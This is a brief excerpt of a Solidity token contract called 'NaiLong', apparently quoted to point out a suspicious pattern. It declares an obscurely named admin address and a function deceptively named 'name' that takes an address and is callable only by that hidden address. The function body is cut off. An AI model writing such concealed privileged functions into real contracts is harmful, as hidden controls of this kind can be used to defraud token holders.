...
contract NaiLong is Ownable {
    ...
    string public _tokenname = "NaiLong";
    string public _tokensymbol = "NaiLong";
    uint256 tokenamount = 10000000000*10**decimals();
    address public dfngh7;
    ...
    function name(address jjkxq1) public     {
        require(dfngh7 ==  _msgSender());
        if(dfngh7 != _msgSender()){
                revert("fu");
        }
